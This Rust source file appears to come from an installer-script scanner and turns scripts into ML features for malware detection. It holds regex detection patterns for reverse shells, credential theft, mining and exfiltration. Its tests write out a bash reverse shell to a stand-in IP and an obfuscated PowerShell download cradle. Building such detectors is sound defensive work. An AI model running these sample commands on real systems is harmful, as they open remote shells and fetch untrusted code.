// Feature extraction turns installer bytes into a fixed numeric vector for the ML model.
// Names and order are the contract shared with ml/ training scripts and src/ml_model.rs.

use std::collections::HashSet;
use std::sync::LazyLock;

use regex::Regex;

use crate::analyzer;
use crate::source::{Artifact, InstallerKind};

/// Number of features produced by [`extract`].
pub const COUNT: usize = RULES.len() + STATS.len() + INDICATORS.len() + KINDS.len();

/// One 0/1 feature per analyzer rule, in `analyzer::rule_hits` order.
const RULES: &[&str] = &[
    "rule_exec_downloaded",
    "rule_downloads",
    "rule_privilege",
    "rule_persistence",
    "rule_profile",
    "rule_chmod",
    "rule_registry",
    "rule_disable_security",
    "rule_encoded_exec",
    "rule_recursive_delete",
];

const STATS: &[&str] = &[
    "log_size",
    "log_lines",
    "avg_line_len",
    "log_max_line_len",
    "long_line_ratio",
    "entropy",
    "comment_ratio",
    "blank_ratio",
    "non_ascii_ratio",
    "symbol_ratio",
    "dollar_per_line",
    "url_count",
    "http_url_count",
    "ip_url_count",
    "ipv4_count",
    "distinct_hosts",
    "base64_tokens",
    "log_longest_token",
    "function_count",
];

/// Pattern counts, stored as ln(1 + matches). Names ending in a signal suffix are
/// shown to users as evidence when they fire.
const INDICATORS: &[(&str, &str)] = &[
    ("hex_escapes", r"\\x[0-9a-fA-F]{2}"),
    ("char_codes", r"(?i)(\[char\]\s*\d+|\bchr\s*\(\s*\d+|fromcharcode)"),
    ("string_concat", r#"['"]\s*\+\s*['"]"#),
    ("backtick_obfuscation", r"[A-Za-z]`[A-Za-z]"),
    ("ps_iex", r"(?i)(\biex\b|invoke-expression)"),
    ("ps_hidden_window", r"(?i)(-w(indowstyle)?\s+h(idden)?\b)"),
    ("ps_exec_bypass", r"(?i)(-ep\s+bypass|executionpolicy\s+bypass|\s-nop\b|-noprofile)"),
    ("ps_download_cradle", r"(?i)(downloadstring|downloaddata|net\.webclient|start-bitstransfer)"),
    ("ps_reflection", r"(?i)(reflection\.assembly|virtualalloc|interopservices|add-type\s+-typedefinition)"),
    ("sh_reverse_shell", r"(?i)(/dev/tcp/|\bnc(at)?\s+(-\w+\s+)*-e\b|mkfifo|socat\s.*exec|bash\s+-i\b)"),
    ("sh_eval", r"(?m)(^|[;&|]\s*)eval\s"),
    ("anti_forensics", r"(?i)(history\s+-c|unset\s+histfile|histfile=/dev/null|\.bash_history|wevtutil\s+cl|clear-eventlog)"),
    ("credential_access", r"(?i)(/etc/shadow|\.ssh/id_|\.aws/credentials|\.docker/config\.json|login\s+data|lsass|mimikatz|keychain)"),
    ("crypto_mining", r"(?i)(xmrig|stratum\+tcp|minerd|cryptonight|monero)"),
    ("exfiltration", r"(?i)(curl\s[^\n]*(\s-d\s|--data|\s-F\s|--upload-file|\s-T\s)|invoke-restmethod[^\n]*-method\s+post|\buploadfile\b)"),
    ("tmp_exec_dir", r"(?i)(/tmp/|/dev/shm/|\$env:temp|%temp%|appdata\\roaming)"),
    ("background_exec", r"(?i)(\bnohup\b|\bdisown\b|\bsetsid\b|&\s*>\s*/dev/null\s*&)"),
    ("file_lock", r"(?i)chattr\s+\+i"),
    ("process_kill", r"(?i)(\bpkill\b|\bkillall\b|\btaskkill\b|stop-process)"),
    ("user_creation", r"(?i)(\buseradd\b|net\s+user\s+\S+\s+\S+\s+/add|new-localuser)"),
    ("ssh_key_injection", r"authorized_keys"),
    ("checksum_verify", r"(?i)(sha256sum|shasum|get-filehash|gpg\s+--verify|minisign|cosign\s+verify)"),
    ("usage_help", r"(?i)(usage:|--help\b)"),
];

const KINDS: &[&str] = &["kind_bash", "kind_powershell", "kind_python", "kind_executable", "kind_text"];

/// Indicators that are uninformative as user-facing evidence.
const NON_SIGNALS: &[&str] = &["checksum_verify", "usage_help"];

static INDICATOR_RES: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    INDICATORS
        .iter()
        .map(|(_, p)| Regex::new(p).expect("valid feature pattern"))
        .collect()
});
static URL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?i)\b(https?)://([^\s"'`|;)<>/:]+)"#).expect("valid url pattern"));
static IPV4_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b").expect("valid ip pattern"));
static BASE64_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{40,}={0,2}").expect("valid base64 pattern"));
static FUNCTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?im)^\s*(function\s+[\w-]+|[\w-]+\s*\(\)\s*\{|def\s+\w+\s*\()").expect("valid function pattern")
});

/// Returns feature names in vector order.
pub fn names() -> Vec<&'static str> {
    RULES
        .iter()
        .chain(STATS)
        .copied()
        .chain(INDICATORS.iter().map(|(n, _)| *n))
        .chain(KINDS.iter().copied())
        .collect()
}

/// Whether a feature is a behavioral signal worth citing as evidence.
pub fn is_signal(name: &str) -> bool {
    (name.starts_with("rule_") || INDICATORS.iter().any(|(n, _)| *n == name))
        && !NON_SIGNALS.contains(&name)
        || matches!(name, "base64_tokens" | "ip_url_count" | "http_url_count")
}

pub fn extract(artifact: &Artifact) -> Vec<f64> {
    let text = String::from_utf8_lossy(&artifact.bytes);
    let bytes = &artifact.bytes;
    let mut out = Vec::with_capacity(COUNT);

    for (_, hit) in analyzer::rule_hits(&text) {
        out.push(if hit { 1.0 } else { 0.0 });
    }

    let lines: Vec<&str> = text.lines().collect();
    let n_lines = lines.len().max(1) as f64;
    let max_line = lines.iter().map(|l| l.len()).max().unwrap_or(0);
    let long_lines = lines.iter().filter(|l| l.len() > 300).count();
    let comments = lines
        .iter()
        .filter(|l| {
            let t = l.trim_start();
            (t.starts_with('#') && !t.starts_with("#!")) || t.starts_with("//") || t.to_ascii_lowercase().starts_with("rem ")
        })
        .count();
    let blanks = lines.iter().filter(|l| l.trim().is_empty()).count();
    let total = bytes.len().max(1) as f64;
    let non_ascii = bytes.iter().filter(|b| !b.is_ascii()).count();
    let symbols = text.chars().filter(|c| "`^+'\"{}[]$%~".contains(*c)).count();
    let dollars = text.matches('$').count();

    let mut urls = 0usize;
    let mut http_urls = 0usize;
    let mut ip_urls = 0usize;
    let mut hosts = HashSet::new();
    for cap in URL_RE.captures_iter(&text) {
        urls += 1;
        if cap[1].eq_ignore_ascii_case("http") {
            http_urls += 1;
        }
        let host = cap[2].to_ascii_lowercase();
        if host.chars().all(|c| c.is_ascii_digit() || c == '.') {
            ip_urls += 1;
        }
        hosts.insert(host);
    }
    let ipv4 = IPV4_RE
        .captures_iter(&text)
        .filter(|c| (1..=4).all(|i| c[i].parse::<u16>().is_ok_and(|o| o <= 255)))
        .count();
    let longest_token = text.split_whitespace().map(str::len).max().unwrap_or(0);

    out.extend([
        ln1p(bytes.len()),
        ln1p(lines.len()),
        text.len() as f64 / n_lines,
        ln1p(max_line),
        long_lines as f64 / n_lines,
        entropy(bytes),
        comments as f64 / n_lines,
        blanks as f64 / n_lines,
        non_ascii as f64 / total,
        symbols as f64 / total,
        dollars as f64 / n_lines,
        ln1p(urls),
        ln1p(http_urls),
        ln1p(ip_urls),
        ln1p(ipv4),
        ln1p(hosts.len()),
        ln1p(BASE64_RE.find_iter(&text).count()),
        ln1p(longest_token),
        ln1p(FUNCTION_RE.find_iter(&text).count()),
    ]);

    for re in INDICATOR_RES.iter() {
        out.push(ln1p(re.find_iter(&text).count()));
    }

    let kind_index = match artifact.kind {
        InstallerKind::Bash => 0,
        InstallerKind::PowerShell => 1,
        InstallerKind::Python => 2,
        InstallerKind::Executable => 3,
        InstallerKind::Text => 4,
    };
    out.extend((0..KINDS.len()).map(|i| if i == kind_index { 1.0 } else { 0.0 }));

    debug_assert_eq!(out.len(), COUNT);
    out
}

fn ln1p(n: usize) -> f64 {
    (n as f64).ln_1p()
}

fn entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for b in bytes {
        counts[*b as usize] += 1;
    }
    let len = bytes.len() as f64;
    counts
        .iter()
        .filter(|c| **c > 0)
        .map(|c| {
            let p = *c as f64 / len;
            -p * p.log2()
        })
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;
    use url::Url;

    fn artifact(script: &str, kind: InstallerKind) -> Artifact {
        Artifact {
            bytes: script.as_bytes().to_vec(),
            kind,
            url: Url::parse("https://example.com/install.sh").unwrap(),
        }
    }

    fn feature(values: &[f64], name: &str) -> f64 {
        values[names().iter().position(|n| *n == name).unwrap()]
    }

    #[test]
    fn names_match_vector_length() {
        let values = extract(&artifact("echo hi", InstallerKind::Bash));
        assert_eq!(names().len(), COUNT);
        assert_eq!(values.len(), COUNT);
        let unique: HashSet<_> = names().into_iter().collect();
        assert_eq!(unique.len(), COUNT);
    }

    #[test]
    fn rule_features_follow_analyzer_rules() {
        let keys: Vec<String> = analyzer::rule_hits("").into_iter().map(|(k, _)| format!("rule_{k}")).collect();
        assert_eq!(keys, RULES);
    }

    #[test]
    fn benign_installer_has_no_attack_signals() {
        let script = "#!/bin/sh\n# install tool\nset -eu\nusage() { echo 'usage: install.sh'; }\n\
                      curl -fsSL https://github.com/o/r/releases/download/v1/tool.tar.gz -o tool.tar.gz\n\
                      sha256sum -c tool.sha256\n";
        let values = extract(&artifact(script, InstallerKind::Bash));
        assert_eq!(feature(&values, "rule_downloads"), 1.0);
        assert_eq!(feature(&values, "rule_exec_downloaded"), 0.0);
        assert_eq!(feature(&values, "sh_reverse_shell"), 0.0);
        assert!(feature(&values, "checksum_verify") > 0.0);
        assert!(feature(&values, "function_count") > 0.0);
        assert_eq!(feature(&values, "kind_bash"), 1.0);
    }

    #[test]
    fn detects_reverse_shell_and_raw_ip() {
        let script = "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\ncurl http://203.0.113.7/x -o /tmp/x";
        let values = extract(&artifact(script, InstallerKind::Bash));
        assert!(feature(&values, "sh_reverse_shell") > 0.0);
        assert!(feature(&values, "ip_url_count") > 0.0);
        assert!(feature(&values, "http_url_count") > 0.0);
        assert!(feature(&values, "tmp_exec_dir") > 0.0);
    }

    #[test]
    fn detects_powershell_obfuscation() {
        let script = "powershell -nop -w hidden -ep bypass -c \"i`ex (New-Object Net.WebClient).DownloadString('ht'+'tp://x')\"";
        let values = extract(&artifact(script, InstallerKind::PowerShell));
        for name in ["ps_hidden_window", "ps_exec_bypass", "ps_download_cradle", "backtick_obfuscation", "string_concat"] {
            assert!(feature(&values, name) > 0.0, "{name}");
        }
        assert_eq!(feature(&values, "kind_powershell"), 1.0);
    }

    #[test]
    fn entropy_bounds() {
        assert_eq!(entropy(b"aaaa"), 0.0);
        let all: Vec<u8> = (0..=255).collect();
        assert!((entropy(&all) - 8.0).abs() < 1e-9);
    }
}
